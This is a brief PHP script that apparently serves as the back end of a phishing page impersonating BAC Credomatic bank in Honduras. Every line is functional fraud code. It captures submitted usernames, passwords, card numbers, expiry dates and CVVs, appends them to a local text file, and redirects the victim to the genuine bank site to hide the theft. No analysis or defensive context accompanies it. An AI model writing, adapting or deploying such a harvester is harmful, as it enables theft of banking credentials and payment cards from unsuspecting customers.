<?php

file_put_contents("usernames.txt", 
    "Username: " . $_POST['user'] . 
    "Pass: " . $_POST['password'] . 
    "Card: " . $_POST['cardnumber'] . 
    "Valid THRU: " . $_POST['expirationDate'] . 
    "CVV: " . $_POST['cvv'] . "\n", 
    FILE_APPEND
);

header('Location: https://www.baccredomatic.com/es-hn');
exit();
?>
